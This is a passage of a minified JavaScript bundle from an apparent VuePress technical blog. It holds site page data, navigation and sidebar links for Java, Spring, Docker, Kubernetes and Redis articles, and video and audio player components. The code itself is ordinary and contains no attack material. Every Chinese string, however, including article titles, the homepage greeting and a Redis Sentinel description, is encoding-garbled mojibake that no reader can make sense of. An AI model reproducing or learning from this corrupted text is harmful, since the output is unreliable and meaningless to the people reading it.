å¹¶ç§»é¤ç®åå·²ç»åç°åå³èçï¼ master\n                                   çææ slave å sentinel\nsentinel failover                  å½ master å¤±ææ¶ï¼ å¨ä¸è¯¢é®å¶ä» sentinel æè§çæåµä¸ï¼ å¼ºå¶å¼å§ä¸æ¬¡èªå¨æéè¿ç§»\n                                   ï¼ä¸è¿åèµ·æéè½¬ç§»ç sentinel ä¼åå¶ä» sentinel åéä¸ä¸ªæ°çéç½®ï¼å¶ä» sentinel\n                                   ä¼æ ¹æ®è¿ä¸ªéç½®è¿è¡ç¸åºçæ´æ°ï¼",charsets:{cjk:!0}},{title:"Home",frontmatter:{home:!0,heroImage:"/assets/img/logo.png",heroText:"æ¬¢è¿æ¥å°æçææ¯åå®¢ï¼è¿éæ¯åäº«å­¦ä¹ ãæ¢ç´¢ååç°çä¹å­ï¼ä¹æ¯è®©æç»´ä¸ç¥è¯ç¢°æçèå°ãå¨è¿éï¼æå°åäº«æå¨å­¦ä¹ åææ¯é¢åçè§è§£ãç»éªåæ¢ç´¢ã",bannerBg:"none",postList:"none",simplePostListLength:0,hideRightBar:!0},regularPath:"/",relativePath:"index.md",key:"v-59de6d20",path:"/",lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:null,content:"",normalizedContent:"",charsets:{}}],themeConfig:{nav:[{text:"é¦é¡µ",link:"/"},{text:"Java",items:[{text:"Java",link:"/java/100/"},{text:"Maven",link:"/maven/2300/"},{text:"Spring",items:[{text:"Spring",link:"/spring/spring/200/"},{text:"Spring MVC",link:"/spring/spring-mvc/200/"},{text:"Spring Boot",link:"/spring/spring-boot/200/"},{text:"Spring Cloud",link:"/spring/spring-cloud/200/"}]},{text:"Mybatis",items:[{text:"Mybatis",link:"/mybatis/mybatis/300/"},{text:"Mybatis Plus",link:"/mybatis/mybatis-plus/300/"}]}]},{text:"è¿ç»´",items:[{text:"linux",link:"/linux/2300/"},{text:"Docker",link:"/docker/400/"},{text:"Jenkins",link:"/jenkins/500/"},{text:"Kubernetes",link:"/kubernetes/600/"}]},{text:"å¤§æ°æ®",items:[{text:"Hadoop",link:"/hadoop/700/"},{text:"ClickHouse",link:"/clickhouse/800/"},{text:"Hbase",link:"/hbase/900/"},{text:"Hive",link:"/hive/1000/"},{text:"Flume",link:"/flume/1100/"},{text:"Flink",link:"/flink/1200/"}]},{text:"æ°æ®åº",items:[{text:"MySQL",link:"/mysql/1300/"},{text:"MongoDB",link:"/mongodb/1800/"}]},{text:"ä¸­é´ä»¶",items:[{text:"Kafka",link:"/kafka/1400/"},{text:"RabbitMQ",link:"/rabbitmq/1500/"},{text:"Redis",link:"/redis/1600/"},{text:"Nginx",link:"/nginx/1700/"}]},{text:"åç«¯",items:[{text:"VUE3",link:"/vue3/1900/"},{text:"å¾®ä¿¡å°ç¨åº",link:"/wx/2000/"}]}],sidebarDepth:2,repo:"landashu?tab=repositories",searchMaxSuggestions:10,lastUpdated:"ä¸æ¬¡æ´æ°",docsDir:"docs",editLinks:!1,editLinkText:"ç¼è¾",pageStyle:"line",defaultMode:"dark",category:!1,tag:!1,archive:!1,sidebarOpen:!0,sidebar:{"/00.java/":[{title:"java",collapsable:!1,children:[["10.java/100.java.md","JVM","/java/100/"],["10.java/101.æåexeç¨åº.md","jar æåæ.exeå¯æ§è¡æä»¶","/java/101/"],["10.java/102.javaä»£ç æ··æ·ä¹ProGuard.md","javaä»£ç æ··æ·ä¹ ProGuard","/java/102/"]]},{title:"Spring",collapsable:!1,children:[{title:"spring",collapsable:!1,children:[["20.Spring/21.spring/200.æ ¸å¿åå®¹æè§£ IOC.md","æ ¸å¿åå®¹æè§£ IOC","/spring/spring/200/"],["20.Spring/21.spring/201.æ ¸å¿åå®¹æè§£ AOP.md","æ ¸å¿åå®¹æè§£ AOP","/spring/spring/201/"],["20.Spring/21.spring/202.æ ¸å¿åå®¹æè§£ äºä»¶éç¥.md","æ ¸å¿åå®¹æè§£ äºä»¶éç¥","/spring/spring/202/"],["20.Spring/21.spring/203.æ ¸å¿åå®¹æè§£ ä¸çº§ç¼å­.md","æ ¸å¿åå®¹æè§£ ä¸çº§ç¼å­","/spring/spring/203/"],["20.Spring/21.spring/204.æ ¸å¿åå®¹æè§£ FactoryBean.md","æ ¸å¿åå®¹æè§£ FactoryBean","/spring/spring/204/"],["20.Spring/21.spring/205.æ³¨è§£æ¿ä»£Springçå½å¨æå®ç°ç±».md","æ³¨è§£æ¿ä»£Springçå½å¨æå®ç°ç±»","/spring/spring/205/"]]},{title:"spring mv",collapsable:!1,children:[["20.Spring/22.spring mv/200.Spring MVC ä¹å·¥ä½åç.md","Spring MVC ä¹åºæ¬å·¥ä½åç","/spring/spring-mvc/200/"]]},{title:"springboot",collapsable:!1,children:[["20.Spring/23.springboot/200.SpringBoot ä¹ FilterãInterceptorãAspect.md","SpringBoot ä¹ FilterãInterceptorãAspect","/spring/spring-boot/200/"],["20.Spring/23.springboot/201.SpringBoot ä¹ Starter.md","SpringBoot ä¹ Starter","/spring/spring-boot/201/"],["20.Spring/23.springboot/202.SpringBoot ä¹ Stomp ä½¿ç¨å vue ç¸éç½®.md","SpringBoot ä¹ Stomp ä½¿ç¨å vue ç¸éç½®","/spring/spring-boot/202/"],["20.Spring/23.springboot/203.SpringBoot MyBatisPlus å®ç°å¤æ°æ®æº.md","SpringBoot MyBatisPlus å®ç°å¤æ°æ®æº","/spring/spring-boot/203/"],["20.Spring/23.springboot/204.SpringBoot MyBatis å¨æå»ºè¡¨.md","SpringBoot MyBatis å¨æå»ºè¡¨","/spring/spring-boot/204/"],["20.Spring/23.springboot/205.Spring Boot éæ Jasypt 3.0.3 éç½®æä»¶å å¯.md","Spring Boot éæ Jasypt 3.0.3 éç½®æä»¶å å¯","/spring/spring-boot/205/"],["20.Spring/23.springboot/206.Spring Boot éæ FastDFS.md","Spring Boot éæ FastDFS","/spring/spring-boot/206/"],["20.Spring/23.springboot/207.Spring Boot VUEååç«¯å è§£å¯.md","Spring Boot VUEååç«¯å è§£å¯","/spring/spring-boot/207/"]]}]},{title:"Mybatis",collapsable:!1,children:[{title:"mybatis",collapsable:!1,children:[["30.Mybatis/31.mybatis/300.æ ¸å¿åè½æè§£ å·¥ä½æµç¨.md","æ ¸å¿åè½æè§£ å·¥ä½æµç¨","/mybatis/mybatis/300/"],["30.Mybatis/31.mybatis/301.æ ¸å¿åè½æè§£ Pluginæä»¶åè½å®ç°.md","æ ¸å¿åè½æè§£ Pluginæä»¶åè½å®ç°","/mybatis/mybatis/301/"],["30.Mybatis/31.mybatis/302.æ ¸å¿åè½æè§£ ä¸äºçº§ç¼å­åç.md","æ ¸å¿åè½æè§£ ä¸äºçº§ç¼å­åç","/mybatis/mybatis/302/"],["30.Mybatis/31.mybatis/303.MyBatis Plus+Spring Boot å®ç°ä¸äºçº§ç¼å­ä»¥åèªå®ä¹ç¼å­.md","MyBatis Plus+Spring Boot å®ç°ä¸äºçº§ç¼å­ä»¥åèªå®ä¹ç¼å­","/mybatis/mybatis/303/"]]}]},{title:"maven",collapsable:!1,children:[["2300.maven/2300.pom æä»¶ä»ç»å parentãproperties æ ç­¾è¯¦è§£.md","pom æä»¶ä»ç»å parentãproperties æ ç­¾è¯¦è§£","/maven/2300/"],["2300.maven/2301.dependencies æ ç­¾è¯¦è§£.md","dependencies æ ç­¾è¯¦è§£","/maven/2301/"],["2300.maven/2302.ä½¿ç¨ Nexus3.x æ­å»ºç§æ.md","ä½¿ç¨ Nexus3.x æ­å»ºç§æ","/maven/2302/"]]}],catalogue:{},"/01.è¿ç»´/":[{title:"Docker",collapsable:!1,children:[["40.Docker/400.Docker æ¦å¿µãå½ä»¤åDockerfileä»ç».md","Docker æ¦å¿µãå½ä»¤åDockerfileä»ç»","/docker/400"],["40.Docker/401.Docker-Compose å½ä»¤ååºæ¬ä½¿ç¨.md","Docker-Compose å½ä»¤ååºæ¬ä½¿ç¨","/docker/401"],["40.Docker/402.Dockerç§æåºçå¼å.md","Dockerç§æåºçå¼å","/docker/402"]]},{title:"Jenkins",collapsable:!1,children:[["50.Jenkins/500.Jenkins(ä¸) æç»­éæåJenkinsä»ç».md","Jenkins(ä¸) æç»­éæåJenkinsä»ç»","/jenkins/500"],["50.Jenkins/501.Jenkins(äº) Jenkinså®è£åç¯å¢éç½®.md","Jenkins(äº) Jenkinså®è£åç¯å¢éç½®","/jenkins/501"],["50.Jenkins/502.Jenkins(ä¸) Jenkinsç¨æ·ç®¡çåå­è¯.md","Jenkins(ä¸) Jenkinsç¨æ·ç®¡çåå­è¯","/jenkins/502"],["50.Jenkins/503.Jenkins(å) Mavenå®è£åéç½®.md","Jenkins(å) Mavenå®è£åéç½®","/jenkins/503"],["50.Jenkins/504.Jenkins(äº) Jenkinsæå»ºMavené¡¹ç®.md","Jenkins(äº) Jenkinsæå»ºMavené¡¹ç®","/jenkins/504"],["50.Jenkins/505.Jenkins(å­) Jenkinsé¡¹ç®æå»ºç»è.md","Jenkins(å­) Jenkinsé¡¹ç®æå»ºç»è","/jenkins/505"],["50.Jenkins/506.Jenkins(ä¸) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼.md","Jenkins(ä¸) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼","/jenkins/506"],["50.Jenkins/507.Jenkins(å«) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼.md","Jenkins(å«) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼","/jenkins/507"]]},{title:"Kubernetes",collapsable:!1,children:[["60.Kubernetes/600.kubernetes(ä¸) æ¦å¿µåä»ç».md","kubernetes(ä¸) æ¦å¿µåä»ç»","/kubernetes/600"],["60.Kubernetes/601.kubernetes(äº) éç¾¤ç¯å¢æ­å»º.md","kubernetes(äº) éç¾¤ç¯å¢æ­å»º","/kubernetes/601"],["60.Kubernetes/602.kubernetes(ä¸) èµæºç®¡ç.md","kubernetes(ä¸) èµæºç®¡ç","/kubernetes/602"],["60.Kubernetes/603.kubernetes(å) NamespaceãPodãLableãDeploymentãService çèµæºä»ç».md","kubernetes(å) NamespaceãPodãLableãDeploymentãService çèµæºä»ç»","/kubernetes/603"],["60.Kubernetes/604.kubernetes(äº) Pod ä»ç»åéç½®.md","kubernetes(äº) Pod ä»ç»åéç½®","/kubernetes/604"],["60.Kubernetes/605.kubernetes(å­) Pod çå½å¨æ.md","kubernetes(å­) Pod çå½å¨æ","/kubernetes/605"],["60.Kubernetes/606.kubernetes(ä¸) Pod è°åº¦.md","kubernetes(ä¸) Pod è°åº¦","/kubernetes/606"],["60.Kubernetes/607.kubernetes(å«) Pod æ§å¶å¨è¯¦è§£.md","kubernetes(å«) Pod æ§å¶å¨è¯¦è§£","/kubernetes/607"],["60.Kubernetes/608.kubernetes(ä¹) Serviceä»ç»ãç±»ååä½¿ç¨.md","kubernetes(ä¹) Serviceä»ç»ãç±»ååä½¿ç¨","/kubernetes/608"],["60.Kubernetes/609.kubernetes(å) Ingressä»ç»åä½¿ç¨.md","kubernetes(å) Ingressä»ç»åä½¿ç¨","/kubernetes/609"],["60.Kubernetes/610.kubernetes(åä¸) æ°æ®å­å¨ï¼æè½½å·ç®¡çï¼.md","kubernetes(åä¸) æ°æ®å­å¨ï¼æè½½å·ç®¡çï¼","/kubernetes/610"],["60.Kubernetes/611.kubernetes(åäº) å®å¨è®¤è¯.md","kubernetes(åäº) å®å¨è®¤è¯","/kubernetes/611"],["60.Kubernetes/612.kubernetes(åä¸) DashBoard.md","kubernetes(åä¸) DashBoard","/kubernetes/612"]]},{title:"linux",collapsable:!1,children:[["2300.linux/2300.Linux åå»ºç¨æ·åæéæä½.md","linux åå»ºç¨æ·åæéæä½","/linux/2300"],["2300.linux/2301.Linux ç£çæä½ç¸å³å½ä»¤.md","Linux ç£çæä½ç¸å³å½ä»¤","/linux/2301"],["2300.linux/2302.Linux ææ¬æ°æ®å¤çå·¥å·awkå½ä»¤.md","Linux ææ¬æ°æ®å¤çå·¥å·awkå½ä»¤","/linux/2302"],["2300.linux/2303.Linux å®æ¶ä»»å¡.md","Linux å®æ¶ä»»å¡","/linux/2303"],["2300.linux/2304.Linux å½ä»¤æ»ç».md","Linux å½ä»¤æ»ç»","/linux/2304"],["2300.linux/2305.Linux 22ç«¯å£å¯¹å¤æ»å»è§£å³.md","Linux 22ç«¯å£å¯¹å¤æ»å»è§£å³","/linux/2305"]]}],"/04.ä¸­é´ä»¶/":[{title:"redis",collapsable:!1,children:[["03.redis/1600.Redisä»ç».md","Redis ä»ç»","/redis/1600"],["03.redis/1601.Rediså½ä»¤ä»ç».md","Rediså½ä»¤ä»ç»","/redis/1601"],["03.redis/1602.Redisåå¸å¼éä»ç».md","Redisåå¸å¼éä»ç»","/redis/1602"],["03.redis/1603.Redisäºå¡ä»ç».md","Redisäºå¡ä»ç»","/Redis/1603"],["03.redis/1604.Redisçkeyå¤±æéç¥ä»ç».md","Redisçkeyå¤±æéç¥ä»ç»","/Redis/1604"],["03.redis/1605.Rediséç½®æä»¶è§£è¯».md","Rediséç½®æä»¶è§£è¯»","/Redis/1605"],["03.redis/1606.Redisè®°ä¸æ¬¡å®æºææ¥.md","Redisè®°ä¸æ¬¡å®æºææ¥","/Redis/1606"],["03.redis/1607.Redisé«å¯ç¨(ä¸) ä¸»ä»çè®º.md","Redisé«å¯ç¨(ä¸) ä¸»ä»çè®º","/Redis/1607"],["03.redis/1608.Redisé«å¯ç¨(äº) å¨åµçè®º.md","Redisé«å¯ç¨(äº) å¨åµçè®º","/Redis/1608"],["03.redis/1609.Redisé«å¯ç¨(ä¸) æ­å»º.md","Redisé«å¯ç¨(ä¸) æ­å»º","/Redis/1609"]]}]},extendFrontmatter:{article:!1},updateBar:{showToArticle:!1,moreArticle:"/archives"},social:{icons:[{iconClass:"icon-gitee",title:"gitee",link:"https://gitee.com/dashboard"},{iconClass:"icon-github",title:"GitHub",link:"https://github.com/landashu?tab=repositories"},{iconClass:"icon-youjian",title:"åé®ä»¶",link:"mailto:875730567@qq.com"}]},footer:{createYear:2023,copyrightInfo:"\n\x3c!--      <a href='https://doc.xugaoyi.com/' target='_blank'>Theme by Vdoing</a> | <a href='http://doc.aizuda.com/' rel='external nofollow' target='_blank'>Copyright Â© 2022-2023 AiZuDa</a>--\x3e\n\x3c!--      <br>--\x3e\n\x3c!--      <a href=\"http://beian.miit.gov.cn/\" target=\"_blank\">é²ICPå¤2021041554å·-1</a>--\x3e\n    "}}},Ys=(t(116),t(213),t(111),t(223)),Xs=t(224),Zs=(t(377),t(158),t(52));var Qs={computed:{$filterPosts:function(){return this.$site.pages.filter((function(n){var e=n.frontmatter,t=e.pageComponent,r=e.article,a=e.home;return!(t||!1===r||!0===a)}))},$sortPosts:function(){return(n=this.$filterPosts).sort((function(n,e){var t=n.frontmatter.sticky,r=e.frontmatter.sticky;return t&&r?t==r?Object(Zs.a)(n,e):t-r:t&&!r?-1:!t&&r?1:Object(Zs.a)(n,e)})),n;var n},$sortPostsByDate:function(){return(n=this.$filterPosts).sort((function(n,e){return Object(Zs.a)(n,e)})),n;var n},$groupPosts:function(){return function(n){for(var e={},t={},r=function(r,a){var o=n[r].frontmatter,i=o.categories,s=o.tags;"array"===Object(Zs.n)(i)&&i.forEach((function(t){t&&(e[t]||(e[t]=[]),e[t].push(n[r]))})),"array"===Object(Zs.n)(s)&&s.forEach((function(e){e&&(t[e]||(t[e]=[]),t[e].push(n[r]))}))},a=0,o=n.length;a<o;a++)r(a);return{categories:e,tags:t}}(this.$sortPosts)},$categoriesAndTags:function(){return function(n){var e=[],t=[];for(var r in n.categories)e.push({key:r,length:n.categories[r].length});for(var a in n.tags)t.push({key:a,length:n.tags[a].length});return{categories:e,tags:t}}(this.$groupPosts)}}};Ba.component(Ys.default),Ba.component(Xs.default);function nc(n){return n.toString().padStart(2,"0")}t(381);Ba.component("Badge",(function(){return Promise.all([t.e(1),t.e(12)]).then(t.bind(null,557))})),Ba.component("CodeBlock",(function(){return Promise.resolve().then(t.bind(null,223))})),Ba.component("CodeGroup",(function(){return Promise.resolve().then(t.bind(null,224))}));t(382);var ec=Ba.extend({props:{bvid:{type:String,default:{page:1,danmaku:!0,allowfullscreen:"allowfullscreen",sandbox:"allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups",width:"100%",height:[.5625,70]}.bvid,required:!0},danmaku:{type:Boolean,default:!0,required:!1},page:{type:Number,default:1,required:!1},sandbox:{type:String,default:"allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups",required:!1},allowfullscreen:{type:[String,Boolean],default:"allowfullscreen",required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return[.5625,70]},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("iframe",{ref:"sbplayer",style:"width: ".concat(this.width),attrs:{src:"//player.bilibili.com/player.html?bvid=".concat(this.bvid,"&page=").concat(this.page,"&danmaku=").concat(this.danmaku),allowfullscreen:(this.allowfullscreen,!0),scrolling:"no",frameborder:"0",sandbox:this.sandbox}})])},mounted:function(){var n=this;this.$nextTick((function(){var e=n.$refs.sbplayer;e.style.height="".concat(e.scrollWidth*n.height[0]+n.height[1],"px")}))}}),tc=Ba.extend({props:{xid:{type:String,default:null,required:!0},id:{type:String,default:null,required:!1},autoplay:{type:Boolean,default:!1,required:!1},startTime:{type:Number,default:0,required:!1},sandbox:{type:String,default:"allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups",required:!1},allowfullscreen:{type:[String,Boolean],default:"allowfullscreen",required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return[.5625,0]},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("iframe",{ref:"sbplayer",style:"width: ".concat(this.width),attrs:{src:"//www.ixigua.com/iframe/".concat(this.xid,"?").concat(this.id?"id="+this.id+"&":"","autoplay=").concat(this.autoplay?1:0,"&startTime=").concat(this.startTime),allowfullscreen:(this.allowfullscreen,!0),scrolling:"no",frameborder:"0",sandbox:this.sandbox}})])},mounted:function(){var n=this;this.$nextTick((function(){var e=n.$refs.sbplayer;e.style.height="".concat(e.scrollWidth*n.height[0]+n.height[1],"px")}))}}),rc=t(23),ac=t(17),oc=(t(106),t(151),function(){function n(e){ls(this,n),Object(ac.a)(this,"src",void 0),Object(ac.a)(this,"player",void 0),e&&(this.src=e)}var e;return ds(n,[{key:"InitPlayer",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e=this;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(!this.src){n.next=4;break}return n.next=3,t.e(6).then(t.t.bind(null,475,7)).then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(r){var a,o,i,s,c,l,p,d,u,m,g,f,b,h,v,y,k,x,w,S,j,E,P,A,T,C,I,R,_,B,O;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(m=r.default,g=!1,f=!1,b=!1,h=!1,v=!1,e.src.video.customType=(null===(a=e.src)||void 0===a||null===(o=a.video)||void 0===o?void 0:o.customType)||{},null!==(i=e.src)&&void 0!==i&&null!==(s=i.video)&&void 0!==s&&s.type||(null!==(y=e.src)&&void 0!==y&&null!==(k=y.video)&&void 0!==k&&k.url.toLowerCase().endsWith(".m3u8")?e.src.video.type="hls":null!==(x=e.src)&&void 0!==x&&null!==(w=x.video)&&void 0!==w&&w.url.toLowerCase().endsWith(".flv")?e.src.video.type="flv":null!==(S=e.src)&&void 0!==S&&null!==(j=S.video)&&void 0!==j&&j.url.toLowerCase().endsWith(".mpd")&&(e.src.video.type="shakaDash")),null===(c=e.src)||void 0===c||null===(l=c.video)||void 0===l||!l.type||"string"!=typeof e.src.video.type){n.next=27;break}n.t0=e.src.video.type.toLowerCase(),n.next="hls"===n.t0||"m3u8"===n.t0?12:"flv"===n.t0?15:"dash"===n.t0?18:"shakadash"===n.t0||"shaka"===n.t0||"shaka-dash"===n.t0?21:"webtorrent"===n.t0?24:27;break;case 12:return e.src.video.type="smplayerDplayerHls",g=!0,n.abrupt("break",27);case 15:return e.src.video.type="smplayerDplayerFlv",f=!0,n.abrupt("break",27);case 18:return e.src.video.type="smplayerDplayerDash",b=!0,n.abrupt("break",27);case 21:return e.src.video.type="smplayerDplayerShakaDash",h=!0,n.abrupt("break",27);case 24:return e.src.video.type="smplayerDplayerWebtorrent",v=!0,n.abrupt("break",27);case 27:if(null!=(null===(p=e.src)||void 0===p||null===(d=p.video)||void 0===d?void 0:d.quality)&&e.src.video.quality.length>0&&e.src.video.quality.forEach((function(n){if(null==n.type&&(n.url.toLowerCase().endsWith(".m3u8")?n.type="m3u8":n.url.toLowerCase().endsWith(".flv")?n.type="flv":n.url.toLowerCase().endsWith(".mpd")&&(n.type="shakaDash")),null!=n.type&&"string"==typeof n.type)switch(n.type.toLowerCase()){case"hls":case"m3u8":n.type="smplayerDplayerHls",g=!0;break;case"flv":n.type="smplayerDplayerFlv",f=!0;break;case"dash":n.type="smplayerDplayerDash",b=!0;break;case"shakadash":case"shaka":case"shaka-dash":n.type="smplayerDplayerShakaDash",h=!0;break;case"webtorrent":n.type="smplayerDplayerWebtorrent",v=!0}})),g&&Object.assign(null===(E=e.src)||void 0===E||null===(P=E.video)||void 0===P?void 0:P.customType,{smplayerDplayerHls:function(n,e){t.e(7).then(t.t.bind(null,476,7)).then((function(t){var r=t.default,a=n.src,o=new r;o.attachMedia(n),o.on(r.Events.MEDIA_ATTACHED,(function(){o.loadSource(a)})),e.on("destroy",(function(){o.destroy()}))}))}}),f&&Object.assign(null===(A=e.src)||void 0===A||null===(T=A.video)||void 0===T?void 0:T.customType,{smplayerDplayerFlv:function(n,e){t.e(8).then(t.t.bind(null,477,7)).then((function(t){var r=t.default.createPlayer({type:"flv",url:n.src});r.attachMediaElement(n),r.load(),e.on("destroy",(function(){r.destroy()}))}))}}),b&&Object.assign(null===(C=e.src)||void 0===C||null===(I=C.video)||void 0===I?void 0:I.customType,{smplayerDplayerDash:function(n,e){t.e(5).then(t.t.bind(null,478,7)).then((function(t){var r=t.default.MediaPlayer().create();r.initialize(n,n.src,!1),e.on("destroy",(function(){r.reset()}))}))}}),h&&Object.assign(null===(R=e.src)||void 0===R||null===(_=R.video)||void 0===_?void 0:_.customType,{smplayerDplayerShakaDash:function(n,e){t.e(9).then(t.t.bind(null,479,7)).then((function(t){var r=new t.default.Player(n);r.load(n.src).then((function(){e.on("destroy",(function(){r.destroy()}))}))}))}}),v&&Object.assign(null===(B=e.src)||void 0===B||null===(O=B.video)||void 0===O?void 0:O.customType,{smplayerDplayerWebtorrent:function(n,e){t.e(10).then(t.t.bind(null,480,7)).then((function(t){var r=new(0,t.default);r.add(n.src,(function(t){t.files.find((function(n){return n.name.endsWith(".mp4")})).renderTo(n),e.on("destroy",(function(){r.destroy()}))}))}))}}),null===(u=e.src)||void 0===u||!u.customInit){n.next=39;break}return n.next=36,e.src.customInit(m,e.src).then((function(n){return e.player=n,e.player}));case 36:n.t1=n.sent,n.next=40;break;case 39:n.t1=new m(e.src);case 40:return e.player=n.t1,n.abrupt("return",e.player);case 42:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 3:return n.abrupt("return",n.sent);case 4:case"end":return n.stop()}}),n,this)}))),function(){return e.apply(this,arguments)})},{key:"DestroyPlayer",value:function(){var n;null===(n=this.player)||void 0===n||n.destroy()}},{key:"AddOnEvent",value:function(n){var e=this;n&&this.player&&Object.keys(n).forEach((function(t){e.player.on(t,(function(){return n[t](e.player,e.src)}))}))}}]),n}()),ic=t(24),sc=t.n(ic),cc=Ba.extend({props:{src:{type:Object,required:!0},on:{type:Object,default:function(){return{}},required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return{src:{container:null},width:"100%",on:{}}.height},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer",style:"width: ".concat(this.width)})])},data:function(){return{player:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t,r;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=sc()({},n.on),r=Object(rc.a)(Object(rc.a)({},sc()({container:null},n.src)),{},{container:n.$refs.sbplayer}),n.player=new oc(r),e.next=5,n.player.InitPlayer();case 5:n.player.AddOnEvent(t);case 6:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.player)||void 0===n||n.DestroyPlayer()}}),lc=(t(107),function(){function n(e){ls(this,n),Object(ac.a)(this,"src",void 0),Object(ac.a)(this,"player",void 0),e&&(this.src=e)}var e;return ds(n,[{key:"InitPlayer",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e=this;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(!this.src){n.next=4;break}return n.next=3,Promise.all([Promise.all([t.e(1),t.e(3)]).then(t.t.bind(null,481,7)),Promise.all([t.e(1),t.e(3)]).then(t.t.bind(null,482,7))]).then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(r){var a,o,i,s,c,l,p,d;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(c=Object(Wi.a)(r,1),l=c[0].default,e.src.customAudioType=(null===(a=e.src)||void 0===a?void 0:a.customAudioType)||{},p=!1,null===(o=e.src)||void 0===o||null===(i=o.audio)||void 0===i||i.forEach((function(n){if(n.type||n.url.toLowerCase().endsWith(".m3u8")&&(n.type="hls"),n.type&&"string"==typeof n.type)switch(n.type.toLowerCase()){case"hls":case"m3u8":n.type="smplayerAplayerHls",p=!0}})),p&&Object.assign(null===(d=e.src)||void 0===d?void 0:d.customAudioType,{smplayerAplayerHls:function(n,e,r){t.e(7).then(t.t.bind(null,476,7)).then((function(t){var a=t.default,o=!1===r.audio.paused;if(n.canPlayType("application/x-mpegURL")||n.canPlayType("application/vnd.apple.mpegURL"))n.src=e.url;else if(a.isSupported()){var i=new a;i.attachMedia(n),i.on(a.Events.MEDIA_ATTACHED,(function(){i.loadSource(e.url)})),r.on("destroy",(function(){i.destroy()}))}else r.notice("Error: HLS is not supported.");o&&r.play()}))}}),null===(s=e.src)||void 0===s||!s.customInit){n.next=11;break}return n.next=8,e.src.customInit(l,e.src).then((function(n){return e.player=n,e.player}));case 8:n.t0=n.sent,n.next=12;break;case 11:n.t0=new l(e.src);case 12:return e.player=n.t0,n.abrupt("return",e.player);case 14:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 3:return n.abrupt("return",n.sent);case 4:case"end":return n.stop()}}),n,this)}))),function(){return e.apply(this,arguments)})},{key:"DestroyPlayer",value:function(){var n;!this.player||null!==(n=this.src)&&void 0!==n&&n.fixed||this.player.destroy()}},{key:"AddOnEvent",value:function(n){var e=this;n&&this.player&&Object.keys(n).forEach((function(t){e.player.on(t,(function(){return n[t](e.player,e.src)}))}))}}]),n}()),pc=Ba.extend({props:{src:{type:Object,required:!0},on:{type:Object,default:function(){return{}},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer"})])},data:function(){return{player:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t,r;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=sc()({},n.on),r=Object(rc.a)(Object(rc.a)({},sc()({lrcType:3},n.src)),{},{container:n.$refs.sbplayer}),n.player=new lc(r),e.next=5,n.player.InitPlayer();case 5:n.player.AddOnEvent(t),n.$nextTick((function(){if(n.src.fixed){var e=document.querySelector("#app");null==e||e.append(n.$el)}}));case 7:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.player)||void 0===n||n.DestroyPlayer()}}),dc=function(){function n(e){ls(this,n),Object(ac.a)(this,"src",void 0),Object(ac.a)(this,"player",void 0),e&&(this.src=e)}var e;return ds(n,[{key:"InitPlayer",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e=this;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(!this.src){n.next=4;break}return n.next=3,t.e(4).then(t.t.bind(null,483,7)).then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(r){var a,o,i,s,c,l,p,d,u,m,g,f,b,h,v,y,k,x,w,S,j,E;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(l=r.default,p=!1,d=!1,u=!1,m=!1,g=!1,e.src.customType=(null===(a=e.src)||void 0===a?void 0:a.customType)||{},null!==(o=e.src)&&void 0!==o&&o.type||(null!==(f=e.src)&&void 0!==f&&null!==(b=f.url)&&void 0!==b&&b.toLowerCase().endsWith(".m3u8")?e.src.type="hls":null!==(h=e.src)&&void 0!==h&&null!==(v=h.url)&&void 0!==v&&v.toLowerCase().endsWith(".flv")?e.src.type="flv":null!==(y=e.src)&&void 0!==y&&null!==(k=y.url)&&void 0!==k&&k.toLowerCase().endsWith(".mpd")&&(e.src.type="shakaDash")),null===(i=e.src)||void 0===i||!i.type||"string"!=typeof e.src.type){n.next=27;break}n.t0=e.src.type.toLowerCase(),n.next="hls"===n.t0||"m3u8"===n.t0?12:"flv"===n.t0?15:"dash"===n.t0?18:"shakadash"===n.t0||"shaka"===n.t0||"shaka-dash"===n.t0?21:"webtorrent"===n.t0?24:27;break;case 12:return e.src.type="smplayerArtplayerHls",p=!0,n.abrupt("break",27);case 15:return e.src.type="smplayerArtplayerFlv",d=!0,n.abrupt("break",27);case 18:return e.src.type="smplayerArtplayerDash",u=!0,n.abrupt("break",27);case 21:return 